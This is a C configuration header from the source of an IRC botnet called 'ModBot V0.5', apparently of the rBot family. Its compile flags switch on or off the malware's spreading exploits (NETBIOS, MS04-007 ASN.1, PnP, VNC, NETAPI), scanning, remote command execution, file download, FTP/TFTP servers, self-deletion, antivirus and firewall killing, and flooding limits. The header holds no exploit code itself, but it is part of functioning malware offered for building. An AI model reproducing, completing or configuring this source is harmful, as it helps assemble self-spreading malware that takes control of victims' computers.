/////////////////////////////////////////////////
//            120|-[ModBot]-V0.5               //
///////////////////////////////////////////////// 
#ifndef NO_ADVSCAN
// #define NO_NETBIOS
// #define NO_MS04007ASN1
// #define NO_PNP
// #define NP_VNC
// #define NO_NETAPI
#endif
// #define NO_NETINFO
// #define NO_SYSINFO
// #define NO_DCC
// #define NO_REMOTECMD
// #define NO_PROCESS
// #define NO_DOWNLOAD
// #define NO_CONNCHECK
// #define NO_BOTVERSION
// #define NO_SCAN
// #define NO_SECURE
// #define NO_HTTP
// #define NO_TFTP
// #define NO_FTPD
// #define NO_WILDCARD
// #define NO_EHANDLER
// #define NO_CRASH
// #define DUMP_ENCRYPT
// #define DEBUG_LOGGING
// #define DEBUG_CONSOLE
// #define NO_MIRCNICK
// #define NO_MODEONCONN
// #define NO_NET
// #define NO_MELT
// #define NO_AIM
// #define NO_CRYPT
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
 #define NO_REGISTRY
 #define NO_SECSYSTEM
 #define NO_AVFW_KILL
 #define NO_IDENT
 #define NO_REALNICK
 #define DEBUG_CRYPT  
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DUMP_ENCRYPT
#define NO_CRYPT
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#define IRCLINE			512
#define MAXTHREADS		500
#define MAXALIASES		16
#define LOGSIZE			128
#define LOGLINE			128
#define MAXLOGINS		1
#define MAX_LINES		500
#define MAXSCANTHRD		500
#define MAXSCANTIME		1000
#define MAXHOSTNAME		255
#define BLOCKSIZE		512
#define FLOOD_DELAY		2000
#define MAXSTRLEN		500
#define MAXNICKLEN		28
#define MAXPINGSIZE		65500
#define MAXTOKENS		32
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#define addpredefinedaliases()
